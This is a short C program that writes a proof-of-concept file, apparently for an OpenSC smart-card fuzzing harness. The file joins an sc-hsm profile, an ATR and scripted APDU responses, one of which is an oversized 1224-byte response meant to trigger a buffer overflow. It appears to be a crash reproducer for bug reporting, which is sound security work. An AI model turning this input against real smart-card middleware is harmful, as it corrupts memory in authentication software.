#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    // Part 1: Valid scconf profile (null-terminated)
    fprintf(f, "[card]\n");
    fprintf(f, "driver = sc-hsm\n");
    fprintf(f, "[newfile]\n");
    fprintf(f, "type = data\n");
    fprintf(f, "file-id = 0x0001\n");
    fprintf(f, "[tokeninfo]\n");
    fprintf(f, "label = test\n");
    fputc(0x00, f); // Null separator

    // Part 2: Reader binary data
    // ATR: 12 bytes length + 12 bytes ATR (matching SC-HSM driver)
    fputc(0x0C, f); // ATR length (12 bytes)
    // Write 12-byte ATR that maps to sc-hsm driver
    fputc(0x3B, f);
    fputc(0x7F, f);
    fputc(0x96, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);

    // Driver name: null-terminated
    fprintf(f, "sc-hsm");
    fputc(0x00, f);

    // APDU responses with length prefixes (2-byte big-endian length before each response)
    // Response 1: SELECT FILE success (0x90 0x00)
    fputc(0x00, f); fputc(0x02, f); // Length = 2
    fputc(0x90, f); fputc(0x00, f);

    // Response 2: READ BINARY success (return some data)
    fputc(0x00, f); fputc(0x02, f); // Length = 2
    fputc(0x90, f); fputc(0x00, f);

    // Response 3: UPDATE BINARY with crafted large length to trigger overflow
    // Length = 0x04C8 = 1224 bytes (matches the reported overflow size)
    fputc(0x04, f); fputc(0xC8, f); // Length = 1224
    // Write 1224 bytes of dummy data (this will be copied into the buffer)
    for (int i = 0; i < 1224; i++) {
        fputc(0x41, f);
    }

    // Additional responses for other commands (safe)
    for (int i = 0; i < 10; i++) {
        fputc(0x00, f); fputc(0x02, f);
        fputc(0x90, f); fputc(0x00, f);
    }

    fclose(f);
    return 0;
}